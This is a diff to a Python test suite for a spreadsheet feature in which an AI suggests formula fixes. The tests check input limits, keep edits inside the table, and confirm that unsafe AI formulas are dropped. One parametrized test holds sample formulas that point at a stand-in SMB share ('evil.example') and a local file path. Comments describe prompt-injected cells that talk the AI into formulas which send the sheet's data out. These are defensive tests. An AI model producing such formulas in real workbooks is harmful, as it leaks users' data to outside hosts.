@@ -104,6 +104,23 @@ def test_fix_route_validates_before_calling_claude(monkeypatch):
         assert post(bad).status_code == 400, bad
 
 
+def test_each_fix_field_is_taken_right_up_to_its_limit_and_refused_one_past_it(monkeypatch):
+    # AH-155: every limit was tested only past it, so a limit cut one short (">=" for ">") refused the right with every
+    # test green, and nothing sent 'formulas' at all
+    monkeypatch.setattr(client, "api_key_configured", lambda: True)
+    seen = []
+    monkeypatch.setattr(client, "suggest_fix", lambda *a, **k: seen.append(a) or {"explanation": "x", "changes": []})
+    last = 16384 - len(COLS)  # the table's last column is then Excel's last, XFD
+    row = [None, None, "=C2*2"]  # the flagged row's formulas, one per column
+    for ok in ({**BODY, "intent": "x" * 2000}, {**BODY, "start_col": last}, {**BODY, "formulas": row}):
+        assert post(ok).status_code == 200, ok
+    assert seen[-1][-1] == row
+    for bad in ({**BODY, "intent": "x" * 2001}, {**BODY, "start_col": last + 1}, {**BODY, "formulas": row[:2]},
+                {**BODY, "formulas": row + [None]}, {**BODY, "formulas": "=C2*2"}, {**BODY, "formulas": {}}):
+        assert post(bad).status_code == 400, bad
+    assert len(seen) == 3
+
+
 def test_fix_route_503_without_key(monkeypatch):
     monkeypatch.setattr(client, "api_key_configured", lambda: False)
     r = post(BODY)
@@ -250,6 +267,22 @@ def test_an_ai_formula_that_reaches_another_workbook_by_path_or_share_is_left_ou
     assert "(Left out D3: the formula reached outside this workbook.)" in out["explanation"]
 
 
+@pytest.mark.parametrize("formula", ["=INDEX('\\\\evil.example\\s\\data.csv'!A1)", "=SUM('\\\\evil.example\\s\\Sheet1'!A1:A2)",
+                                     "=INDEX('C:\\Users\\Public\\data.txt'!A1)"])
+def test_an_ai_formula_naming_a_share_or_path_that_is_not_a_workbook_file_is_left_out(monkeypatch, formula):
+    # AH-155: every share above ends in .xlsx'!, which OUTSIDE's .xl rule catches alone, so its backslash rule was held
+    # by no test; INDEX and SUM are on the safe list, so the backslash is all that stops Excel fetching the share over SMB
+    wide = COLS + ["D", "E"]
+    answer = {"explanation": "x", "changes": [{"cell": "D3", "new": formula}, {"cell": "E3", "new": "=B3*C3"}]}
+    srv, _ = stub_api(monkeypatch, [{"type": "text", "text": json.dumps(answer)}])
+    try:
+        out = client.suggest_fix(wide, [r + ["", ""] for r in ROWS], 1, 0, 0, "", "fill D")
+    finally:
+        srv.shutdown()
+    assert [c["cell"] for c in out["changes"]] == ["E3"]  # an ordinary formula is still kept
+    assert "(Left out D3: the formula reached outside this workbook.)" in out["explanation"]
+
+
 def test_an_ai_formula_using_a_function_not_on_the_safe_list_is_left_out(monkeypatch):
     # 2026-10-15 audit: the old blocklist let these through. Each one can send the sheet's data out, or read
     # another workbook, after a prompt-injected cell talks the AI into it (the user still sees a preview).
@@ -304,6 +337,13 @@ def test_suggest_fix_keeps_to_the_table(monkeypatch):  # a prompt-injected cell 
         srv.shutdown()
     assert [c["cell"] for c in out["changes"]] == ["A1", last]  # header row + data rows only
     assert "outside the table" in out["explanation"] and "ZZ9999" in out["explanation"]
+
+
+def test_the_ai_may_write_only_the_tables_header_row_and_data_rows():
+    # AH-155: the test above also passed with the row under the table let in, since the cells the AI was shown drop it too
+    inside = lambda cell: client._in_table(cell, 2, 1, 3, 3)  # header in row 3, data rows 4-6, columns B-D
+    assert all(map(inside, ["B3", "D3", "B6", "D6", "C5"]))
+    assert not any(map(inside, ["B2", "B7", "A4", "E4", "D7"]))
 
 
 def test_with_no_request_a_fix_changes_only_the_flagged_row(monkeypatch):
